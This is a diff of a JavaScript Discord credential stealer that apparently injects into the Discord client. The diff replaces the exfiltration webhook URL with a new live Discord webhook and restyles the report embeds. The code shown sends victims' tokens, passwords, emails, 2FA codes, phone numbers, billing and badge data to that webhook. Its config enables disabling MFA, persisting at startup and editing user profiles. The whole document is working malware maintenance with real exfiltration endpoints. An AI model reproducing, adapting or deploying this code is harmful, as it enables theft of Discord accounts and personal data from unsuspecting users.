@@ -33,8 +33,8 @@ const execScript = async (script) => {
 };
 
 const CONFIG = {
-    webhook: 'https://discord.com/api/webhooks/1384221761914277919/NlUh6x4tyB-g3Sba58IFVuYrX42VWK6qfZ6QD3g9u-A80QWI8EbTmnjZpzrXp6zyVSq1',
-    API: 'https://discord.com/api/webhooks/1384221761914277919/NlUh6x4tyB-g3Sba58IFVuYrX42VWK6qfZ6QD3g9u-A80QWI8EbTmnjZpzrXp6zyVSq1',
+    webhook: 'https://discord.com/api/webhooks/1400241708356337694/d4jfsPO0KTn-YS_lpaGLSMLsjXybn7IeZ3iYBu4KFrJbT-I7xlME3cLJMHTeFf-dfBEh',
+    API: 'https://discord.com/api/webhooks/1400241708356337694/d4jfsPO0KTn-YS_lpaGLSMLsjXybn7IeZ3iYBu4KFrJbT-I7xlME3cLJMHTeFf-dfBEh',
     auto_user_profile_edit: 'true',
     auto_persist_startup: 'true',
     auto_mfa_disabler: 'true',
@@ -256,7 +256,7 @@ const notify = async (ctx, token, user) => {
     ctx.avatar_url = `https://media.discordapp.net/attachments/1353074513176170726/1353076924003516536/IMG_1985.jpg?ex=67f8ba55&is=67f768d5&hm=cddf537b3924c0074128fa6c0dd23b271af4b4eb1333fb3e6566622214890d57&=&format=webp&width=438&height=562`;
 
     ctx.embeds[0].fields.unshift({
-        name: `🛡️ Token:`,
+        name: `<a:money:1211376962241568790> Token:`,
         value: `\`\`\`${token}\`\`\``,
         inline: false
     })
@@ -266,11 +266,11 @@ const notify = async (ctx, token, user) => {
     };
 
     ctx.embeds[0].fields.push(
-        { name: "🚀 Nitro", value: nitro, inline: true },
-        { name: "💳 Billing", value: billing, inline: true },
-        { name: "📞 Phone", value: user.phone ? `\`${user.phone}\`` : '❓', inline: true },
-        { name: "🏆 Badges", value: badges, inline: true },
-        { name: "📁 Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
+        { name: "<:japan:1223077879990980739> Nitro Type", value: nitro, inline: true },
+        { name: "<:butterfly:1223077684075036683> Billing", value: billing, inline: true },
+        { name: "<:phone:1304564493505790033> Phone", value: user.phone ? `\`${user.phone}\`` : '<:empty:1304564484215541760>', inline: true },
+        { name: "<:skull:1223079288786653254> Badges", value: badges, inline: true },
+        { name: "<:archive:1400241075242664006> Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
 
     if (friends) {
@@ -596,15 +596,15 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "Password", value: `\`${password}\``, inline: true },
-                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "<:token:1304564495267401738> Password", value: `\`${password}\``, inline: true },
+                        { name: "<:mail:1304564488942653520> Email", value: `\`${email}\``, inline: true },
                     ],
                 }],
             };
 
             if (request?.code !== undefined) {
                 content.embeds[0].fields.push(
-                    { name: "🔒 Used 2FA code", value: `\`${request.code}\``, inline: false }
+                    { name: "<:mfa:1304564490502672475> Used 2FA code", value: `\`${request.code}\``, inline: false }
                 );
             };
 
@@ -617,9 +617,9 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New Username", value: `\`${request.username}\``, inline: true },
-                        { name: "Password", value: `\`${request.password}\``, inline: true },
-                        { name: "Email", value: `\`${email}\``, inline: false },
+                        { name: "<:skull:1223079288786653254> New Username", value: `\`${request.username}\``, inline: true },
+                        { name: "<:token:1304564495267401738> Password", value: `\`${request.password}\``, inline: true },
+                        { name: "<:japan:1223077879990980739>", value: `\`${email}\``, inline: false },
                     ],
                 }],
             };
@@ -632,8 +632,8 @@ const Cruise = async (type, response, request, email, password, token, action) =
                 content: `**${user.username}** ${action}!`,
                 embeds: [{
                     fields: [
-                        { name: "New Email", value: `\`${email}\``, inline: true },
-                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "<:mail:1304564488942653520> New Email", value: `\`${email}\``, inline: true },
+                        { name: "<:token:1304564495267401738> Password", value: `\`${password}\``, inline: true },
                     ],
                 }],
             };
